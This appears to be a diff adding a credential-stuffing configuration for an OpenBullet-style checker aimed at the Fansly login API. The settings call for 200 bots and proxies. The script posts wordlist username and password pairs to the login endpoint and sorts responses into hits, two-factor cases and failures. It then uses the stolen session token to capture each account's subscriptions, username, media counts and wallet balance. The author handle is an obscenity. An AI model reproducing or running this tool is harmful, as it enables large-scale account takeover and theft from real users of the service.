@@ -1,0 +1,134 @@
+[SETTINGS]
+{
+  "Name": "fansly",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-04T22:31:27.0212412+00:00",
+  "AdditionalInfo": "",
+  "Author": "@YOUR_MOTHER_FUCKER_BITCH",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#@YOUR_MOTHER_FUCKER_BITCH REQUEST POST "https://apiv2.fansly.com/api/v1/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"deviceId\":\"288620563805515776\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: apiv2.fansly.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Referer: https://fansly.com/" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Origin: https://fansly.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 96" 
+
+#@YOUR_MOTHER_FUCKER_BITCH KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "session" 
+    KEY "accountId" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "twofa" 
+    KEY "type\":2" 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+    KEY "invalid login" 
+
+#@YOUR_MOTHER_FUCKER_BITCH PARSE "<SOURCE>" JSON "accountId" -> VAR "accountId" 
+
+#@YOUR_MOTHER_FUCKER_BITCH PARSE "<SOURCE>" JSON "id" -> VAR "id" 
+
+#@YOUR_MOTHER_FUCKER_BITCH PARSE "<SOURCE>" JSON "token" -> VAR "token" 
+
+#@YOUR_MOTHER_FUCKER_BITCH REQUEST GET "https://apiv2.fansly.com/api/v1/subscriptions" 
+  
+  HEADER "Host: apiv2.fansly.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Referer: https://fansly.com/" 
+  HEADER "authorization: <token>" 
+  HEADER "Origin: https://fansly.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#@YOUR_MOTHER_FUCKER_BITCH PARSE "<SOURCE>" LR "\"subscriptions\":" "," -> CAP "subscriptions" 
+
+#@YOUR_MOTHER_FUCKER_BITCH PARSE "<SOURCE>" LR "subscriptionPlans\":" "}" -> CAP "subscriptionPlans" 
+
+#@YOUR_MOTHER_FUCKER_BITCH REQUEST GET "https://apiv2.fansly.com/api/v1/account?ids=<accountId>" 
+  
+  HEADER "Host: apiv2.fansly.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Referer: https://fansly.com/" 
+  HEADER "authorization: <token>" 
+  HEADER "Origin: https://fansly.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#@YOUR_MOTHER_FUCKER_BITCH PARSE "<SOURCE>" JSON "username" CreateEmpty=FALSE -> CAP "username" 
+
+#@YOUR_MOTHER_FUCKER_BITCH PARSE "<SOURCE>" JSON "imageCount" CreateEmpty=FALSE -> CAP "imageCount" 
+
+#@YOUR_MOTHER_FUCKER_BITCH PARSE "<SOURCE>" JSON "videoCount" CreateEmpty=FALSE -> CAP "videoCount" 
+
+#@YOUR_MOTHER_FUCKER_BITCH PARSE "<SOURCE>" LR "\"balance\":" "," CreateEmpty=FALSE -> CAP "balance" 
+
+#@YOUR_MOTHER_FUCKER_BITCH FUNCTION Constant "@YOUR_MOTHER_FUCKER_BITCH" -> CAP "Config By" 
+
+#@YOUR_MOTHER_FUCKER_BITCH KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<balance>" EqualTo "0" 
+
